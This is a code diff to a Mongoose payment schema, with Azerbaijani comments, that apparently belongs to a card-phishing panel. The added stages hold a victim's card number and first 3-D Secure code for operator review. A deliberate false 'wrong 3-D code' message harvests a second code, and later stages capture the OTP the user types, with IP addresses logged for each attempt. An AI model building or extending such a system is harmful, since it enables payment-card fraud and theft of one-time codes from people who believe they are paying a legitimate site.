@@ -13,6 +13,24 @@ const paymentSchema = new mongoose.Schema({
     index: true
   },
 
+  /* ==================== Axın mərhələsi ====================
+     card_review  — kart + 1-ci 3-D kod admin təsdiqini gözləyir
+     wrong_code   — admin 1-ci dəfə təsdiqlədi: istifadəçiyə "səhv 3-D kod" göstərilir,
+                    kod təkrar göndərilir və yenidən geri sayım başlayır
+     otp_entry    — admin 2-ci dəfə təsdiqlədi: istifadəçidə OTP ekranı açılır
+     otp_review   — istifadəçi OTP-ni yazdı, yekun admin təsdiqi gözlənilir
+     done         — yekunlaşıb (təsdiq və ya rədd)                                */
+  stage: {
+    type: String,
+    enum: ['card_review', 'wrong_code', 'otp_entry', 'otp_review', 'done'],
+    default: 'card_review',
+    index: true
+  },
+  /* Hər mərhələdə ekranda göstərilən 2 dəqiqəlik geri sayımın bitmə vaxtı */
+  stageDeadline: { type: Date },
+  stageStartedAt: { type: Date },
+  wrongCodeAt: { type: Date },
+
   /* Kart məlumatları — yalnız idarəetmə panelində göstərilir */
   card: {
     number: { type: String, default: '' },
@@ -23,13 +41,15 @@ const paymentSchema = new mongoose.Schema({
     brand: { type: String, default: '' }
   },
 
-  /* 3-D Secure doğrulama kodu */
+  /* İstifadəçinin kart forması ilə birlikdə yazdığı 1-ci 3-D kod */
+  firstCode: { type: String, default: '' },
+  /* 3-D Secure doğrulama kodu (sistem tərəfindən yaradılır) */
   verificationCode: { type: String, default: '' },
-  /* İstifadəçinin 3-D ekranında yazdığı REAL kod — əvvəllər sxemdə olmadığı üçün
-     Mongoose (strict) onu atırdı və admin yalnız təsadüfi yaradılmış kodu görürdü */
+  /* İstifadəçinin OTP ekranında yazdığı REAL kod */
   submittedCode: { type: String, default: '' },
   codeAttempts: [{
     code: { type: String, default: '' },
+    kind: { type: String, default: '3ds' },
     at: { type: Date, default: Date.now },
     ip: { type: String, default: '' }
   }],
@@ -38,6 +58,7 @@ const paymentSchema = new mongoose.Schema({
   /* Admin addımları */
   adminApprovedCardAt: { type: Date },
   adminApprovedBy: { type: String, default: '' },
+  adminResentAt: { type: Date },
   adminFinalApprovedAt: { type: Date },
   adminFinalBy: { type: String, default: '' },
   declinedReason: { type: String, default: '' },
